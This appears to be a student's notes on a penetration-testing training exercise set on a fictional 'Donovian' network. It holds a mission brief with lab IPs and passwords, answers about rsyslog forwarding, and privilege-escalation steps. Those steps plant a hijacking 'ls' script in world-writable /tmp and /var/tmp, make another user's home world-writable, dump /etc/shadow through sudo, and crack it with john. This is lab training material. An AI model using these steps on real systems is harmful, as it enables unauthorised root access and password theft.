Donovian Linux Privilege Escalation, and Persistence (DLP)
XX Feb 2027
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Linux hosts.

Tools/Techniques: SSH masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Linux techniques to gain privileged access and persist are limited to host misconfigurations, open suid/sgid, weak permissions, and path. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = H@RDl1nux5t@rt0F@ct1v1ty

Prior Approvals: Privilege escalation, persistence, and restarting of services through host reboot. Host survey and log sanitation utilizing native command shells, which shell is at discretion of student. NOT authorized is uploading of tools or altering account information.

Scheme of Maneuver:
>Jump Box
->Pivot:192.168.28.105
--->T1: 192.168.28.27
--->T2: 192.168.28.12

Target Section:

Pivot
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
PSP: rkhunter
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: unknown
IP: 192.168.28.27
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.

T2
Hostname: unknown
IP: 192.168.28.12
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.


## Cover
### rsyslog 1
Which rule will send a message to any logged in user?
- *.emerg				:omusrmsg:*

### rsyslog 2
Yes/No: If this file were named /etc/rsyslog.conf, would the configuration be a concern for us if we gained accessed through secure shell as an attacker?
- Y; all logs being forwarded to log server

### rsyslog 3
Which active rule or rules is using a abnormal logging location?
- local7.alert		        /var/tmp/boot.log
  - not usual to see the local1-20 sent to boot.log

### rsyslog 4
What priority level will user facility log?
- 1.!crit,!debug,emerg,!info   -/var/log/user.log
  - only looking for emerg

### rsyslog 5
Is remote logging enabled?
- Y
  - *.* action(type="omfwd" target="193.0.12.1" port="10514" protocol="udp")

### rsyslog 6
What servers could this system send logs to? (also consider commented entries)
- 193.0.12.1
  - # *.*       @@192.0.2.1:13232
    *.* action(type="omfwd" target="193.0.12.1" port="10514" protocol="udp")
    #*.* action(type="omfwd" target="192.0.42.1" port="1514" protocol="udp")

### rsyslog 7
What transport layer protocol does @@ utilize for communications when remote logging?
- TCP

### rsyslog 8
Which rules are inactive, what are their facilities?
- auth, authpriv, cron, ftp, kern, lpr

### Log Sanitization


## Priv
### Enumerate
There is a user on the system with the ability to sudo certain programs that has a '.' dot in their path and is navigating to and listing the contents of common world writable directories approximately every five minutes.
The user's script is running like this:
cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
The flag is located in this users home directory.
- cat /etc/passwd
- ls -la /home/billybob
- cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
  - systemd-private-f54afd5959054b778cf2e07e39e85539-systemd-resolved.service-VdDtii
    systemd-private-f54afd5959054b778cf2e07e39e85539-systemd-timesyncd.service-b22usC
- create script for 'ls'
  - nano ls
    - #! /bin/bash
      chmod 777 /home/billybob
  - chmod +x ls
  - cp ls /var/tmp/
  - watch ls -la /home/billybob
- 'f!@g1.txt'

### Escalate
A command this user is able to sudo can be abused to obtain access as another user. This may take some research and effort to obtain root access with it.
It is possible that your initial user does not have sudo privileges and that you will need to move laterally to another account.
The flag can be found under the root profile directory
- sudo -l
- updated the ls script
  - #! /bin/bash
    sudo -l
    sudo cat /etc/shadow >> pass
- monitor for pass update
- take zeus shadow out and place in ops box
- run john
  - john --wordlist=<wordlist> zeus
  - john --show zeus
    - grab password
   
  
